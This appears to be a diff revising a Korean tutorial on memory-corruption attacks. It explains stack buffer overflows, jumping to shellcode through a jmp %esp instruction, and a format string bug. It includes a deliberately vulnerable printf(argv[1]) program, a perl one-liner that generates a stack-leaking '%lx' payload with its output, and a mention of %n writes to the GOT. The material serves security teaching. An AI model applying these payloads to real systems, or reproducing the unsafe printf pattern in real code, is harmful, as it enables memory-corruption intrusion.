@@ -19,7 +19,7 @@ Contents
 
 
 # 버퍼 오버플로우
- 버퍼 (buffer)는 [3, Ch. 8.5.]가 설명하는 전형적인 표준 입출력의 구현에서 볼 수 있듯이 데이터를 이동시킬 때 일시적으로 보관하기 위한 메모리이다. 이러한 버퍼의 필요성은 [4]가 입증하고, 그것은 상대적으로 매우 큰 양의 출력 데이터를 효율적으로 표기하는 문제가 자기 기록 장치라는 버퍼를 출력 장치로 제공하였을 때 해결됨을 보인 것이다. 이는 버퍼의 초기 구현으로 볼 수 있고, 큰 데이터의 이동을 효율적으로 수행한다는 목적은 오늘날에도 그대로 적용된다.
+ 버퍼 (buffer)는 [3, Ch. 8.5.]가 설명하는 전형적인 표준 입출력의 구현에서 볼 수 있듯이 데이터를 이동시킬 때 일시적으로 보관하기 위한 메모리이다. 이러한 버퍼의 필요성은 [4]가 보이고, 그것은 상대적으로 매우 큰 양의 출력 데이터를 효율적으로 표기하는 문제가 자기 기록 장치라는 버퍼를 출력 장치로 제공하였을 때 해결됨을 보인 것이다. 이는 버퍼의 초기 구현으로 볼 수 있고, 큰 데이터의 이동을 효율적으로 수행한다는 목적은 오늘날에도 그대로 적용된다.
 
  버퍼 오버플로우 취약점은 프로그램이 버퍼에 저장될 것이라고 기대하는 크기를 초과하는 양의 데이터를 입력할 수 있을 때 발생하는 취약점이다. 이 취약점을 공격하는 방법은 버퍼가 어떤 메모리 영역에 위치하는지에 따라 다르다. 예를 들어, [5]는 스택 버퍼 오버플로우 취약점을 공격하는 방법을 설명한다.
 
@@ -148,9 +148,9 @@ epilogue:
 위 어셈블리어 코드에서 확인할 수 있듯이 함수 프롤로그와 에필로그는 함수의 정상적인 호출과 리턴을 위한 작업들을 포함한다. 그리고 스택 프레임에는 함수의 정상적인 호출과 리턴을 위한 정보들이 저장된다. 즉, 프로그램의 실행 흐름에 보다 직접적으로 관여하는 정보가 스택 프레임에 저장된다는 것이다.
 
 ### 쉘코드로 점프하는 방법
- 앞에서 스택 프레임에 저장되는 정보가 프로그램의 실행 흐름에 깊게 관여한다고 설명하였다. 이 중에서 대표적인 것이 바로 리턴 주소 (Return Address)이다. 리턴 주소는 함수 에필로그에서 ret 명령어를 통해 pop되고 이는 명령 포인터 (Instruction Pointer)에 로드된다. 그리고 이렇게 로드된 리턴 주소에 위치한 명령어가 실행된다. 이때 리턴 주소를 조작하여 공격 코드의 주소 또는 공격 코드의 주소를 최종적으로 명령 포인터에 로드하는 코드의 주소로 변경할 수 있다면, 프로그램의 실행 흐름을 바꿀 수 있다. 일반적으로 프로그램의 실행 흐름을 조작할 수 있을 때 그 목적지는 쉘 (명령어 해석기)을 호출하는 명령어 코드가 저장된 곳이 되는데 그 이유는 리눅스의 경우에 타깃 컴퓨터를 제어할 수 있기 때문이다. 여기서는 쉘을 호출하기 위한 명령어 코드 조각이 사용되는데 이는 보통 쉘코드라고 불린다. 여기서는 쉘코드보다는 쉘코드로 점프하는 것 자체에 초점을 맞출 것이다.
+ 앞에서 스택 프레임에 저장되는 정보가 프로그램의 실행 흐름에 깊게 관여한다고 설명하였다. 이 중에서 대표적인 것이 바로 리턴 주소 (Return Address)이다. 리턴 주소는 함수 에필로그에서 ret 명령어를 통해 pop되고 이는 명령 포인터 (Instruction Pointer)에 로드된다. 그리고 이렇게 로드된 리턴 주소에 위치한 명령어가 실행된다. 이때 리턴 주소를 조작하여 공격 코드의 주소 또는 공격 코드의 주소를 최종적으로 명령 포인터에 로드하는 코드의 주소로 변경할 수 있다면, 프로그램의 실행 흐름을 바꿀 수 있다. 일반적으로 프로그램의 실행 흐름을 조작할 수 있을 때 그 목적지는 쉘 (명령어 해석기)을 호출하는 명령어 코드가 저장된 곳이 되는데 그 이유는 리눅스의 경우에 쉘을 통해 타깃 컴퓨터를 제어할 수 있기 때문이다. 여기서는 쉘을 호출하기 위한 명령어 코드 조각이 사용되는데 이는 보통 쉘코드라고 불린다. 여기서는 쉘코드보다는 쉘코드로 점프하는 것 자체에 초점을 맞출 것이다.
 
- 예를 들어, 다음과 같이 구성된 스택이 존재한다고 가정하자.
+ 예를 들어, 다음과 같이 구성된 스택을 생각해보자.
 
 ```
 (LOW) ... [BBBBBBBBBBBB][FFFF][RRRR][SSSSSSSS...] ... (HIGH)
@@ -211,7 +211,7 @@ epilogue:
 
 위 진행 결과를 보면 %eip가 %esp로 점프하는 명령어의 주소를 가지게 됨을 알 수 있다. 이때 %esp에는 쉘 코드가 저장되어 있으므로 쉘 코드가 실행될 것이다.
 
- 그럼 %esp로 점프하는 어셈블리 명령어의 주소를 얻는 방법에 대해 살펴보자. %esp로 점프하는 명령어의 주소를 얻기 위해서는 먼저 그 명령어의 기계어 코드를 얻어야 한다. 그 이유는 CPU가 최종적으로 실행하는 것은 기계어이고, 명령어가 갖는 기계어의 조합을 쪼개서 CPU가 인식하는 것을 공격에 필요한 명령어로 바꿀 수 있기 때문이다. 여기서 얻고자 하는 기계어 코드를 얻는 좋은 방법은 다음과 같은 코드를 작성하고 컴파일한 후에 실행파일을 확인하는 것이다.
+ 그럼 %esp로 점프하는 어셈블리 명령어의 주소를 얻는 방법에 대해 살펴보자. %esp로 점프하는 명령어의 주소를 얻기 위해서는 먼저 그 명령어의 기계어 코드를 얻어야 한다. 그 이유는 CPU가 최종적으로 실행하는 것은 기계어이고, 설령 얻고자 하는 명령어가 없다고 하더라도 명령어가 갖는 기계어의 조합을 쪼개서 CPU가 인식하는 것을 공격에 필요한 명령어로 바꿀 수 있기 때문이다. 여기서 얻고자 하는 기계어 코드를 얻는 좋은 방법은 다음과 같은 코드를 작성하고 컴파일한 후에 실행파일을 확인하는 것이다.
 
 ```C
 /* gcc ex2_find_machine_code.c -o ex2_find_machine_code */
@@ -266,9 +266,9 @@ $
  형식 문자열 취약점 (Format String Vulnerability)은 다음과 같이 printf 함수를 마치 puts 함수처럼 사용할 때 발생한다. 먼저 다음과 같은 코드를 가정해보자.
  
 ```C
-/* ex3_fmt_string_vuln.c */
 #include <stdio.h>
 
+/* gcc ex3_fmt_string_vuln.c -o ex3_fmt_string_vuln */
 int main(int argc, char *argv[])
 {
 	printf(argv[1]);
@@ -276,15 +276,13 @@ int main(int argc, char *argv[])
 }
 ```
 
-그리고 위 프로그램에 전달할 인자를 다음과 같이 먼저 출력해서 복사해놓자.
+그리고 위 프로그램에 전달할 인자가 다음과 같은 명령어의 실행 결과라고 하자.
 
 ```bash
 $ perl -e 'print "A" x 4 . "/%lx" x 1024;'
-AAAA/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx
-$
 ```
 
-위에서 복사한 문자열을 인자로 전달하면 다음과 같은 결과를 얻는다.
+위 명령어의 실행 결과를 복사한 문자열을 인자로 전달하면 다음과 같은 결과를 얻는다.
 
 ```bash
 $ ./ex3_fmt_string_vuln AAAA/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx
@@ -292,22 +290,23 @@ AAAA/7ffca5fda088/7ffca5fda0a0/560e27aecdc0/7f0f3aaddf10/7f0f3ab02040/7ffca5fda0
 $
 ```
 
-위 결과를 잘 살펴보면 "/41414141006e6c75/786c252f786c252f"라는 바이트열을 확인할 수 있다. 이 바이트열은 리틀 엔디언으로 저장된 것이 그대로 출력된 것이므로 "/75 6c 6e 00 41 41 41 41/2f 25 6c 78 2f 25 6c 78"가 된다 (구분할 수 있도록 공백을 두었다). 그리고 이를 아스키 코드표에 따라 변환하면 "/u l n (nil) A A A A// % l x / % l x"이 된다. 즉, 인자로 전달된 문자열이 읽어들여졌고 %lx라는 형식 지정자에 따라 해석되어 출력되었다. 이는 형식 문자열 버그가 x64 시스템에서도 (비록 함수호출규약이 다르다고 해도) 여전히 동작함을 증명한다. 현재 상황을 그림으로 표현하면 다음과 같다.
+위 결과를 잘 살펴보면 "/41414141006e6c75/786c252f786c252f"라는 바이트열을 확인할 수 있다. 이 바이트열은 리틀 엔디언으로 저장된 것이 그대로 출력된 것이므로 "/75 6c 6e 00 41 41 41 41/2f 25 6c 78 2f 25 6c 78"가 된다 (구분할 수 있도록 공백을 두었다). 그리고 이를 아스키 코드표에 따라 변환하면 "/u l n (nil) A A A A// % l x / % l x"이 된다 (마찬가지로 구분할 수 있도록 공백을 두었다). 즉, 인자로 전달된 문자열이 읽어들여졌고 전달된 문자열 중에서 "%lx"라는 문자열이 형식 지정자로 해석되어 해당되는 인자가 스택으로부터 형식에 따라 출력되었다. 이 과정이 계속 진행되면서 스택에서 인자로 전달된 문자열이 위치한 부분까지 출력된 것이다. 현재 상황을 그림으로 표현하면 다음과 같다.
 
 ```
+[Format String]         [Stack]
 +--------------+
 |     AAAA     |                         -> printf("AAAA");
-+--------------+    +--------------+
-|     /%lx     | -> | 7ffc36f4edf8 |     -> printf("/%lx", 0x7ffc36f4edf8);
-+--------------+    +--------------+
-|     ...      |                            ...
++--------------+    +------------------+
+|     /%lx     | -> | 7ffc36f4edf8     | -> printf("/%lx", 0x7ffc36f4edf8);
++--------------+    +------------------+
+|     ...      |    |      ...         |        ...
 +--------------+    +------------------+
 |     /%lx     | -> | 41414141006e6c75 | -> printf("/%lx", 0x41414141006e6c75);
 +--------------+    +------------------+
 |     /%lx     | -> | 786c252f786c252f | -> printf("/%lx", 0x786c252f786c252f);
 +--------------+    +------------------+
-|     ...      |                            ...
-+--------------+
+|     ...      |    |      ...         |        ...
++--------------+    +------------------+
 ```
 
 위 결과로부터 형식 문자열 버그를 통해 printf 함수에 전달한 문자열을 특정 형식 지정자로 출력할 수 있음을 알 수 있다. 즉, %s를 통해 해당 메모리 주소의 내용을 읽는 것도, %n을 통해 해당 메모리 주소에 값을 쓰는 것도 (메모리 주소가 유효하다면) 가능하다는 것이다. 이러한 임의 주소 쓰기가 사용되는 대표적인 곳이 동적으로 링크되느 라이브러리 함수들의 절대 주소가 저장되는 전역 오프셋 테이블 (Global Offset Table, GOT)이다.
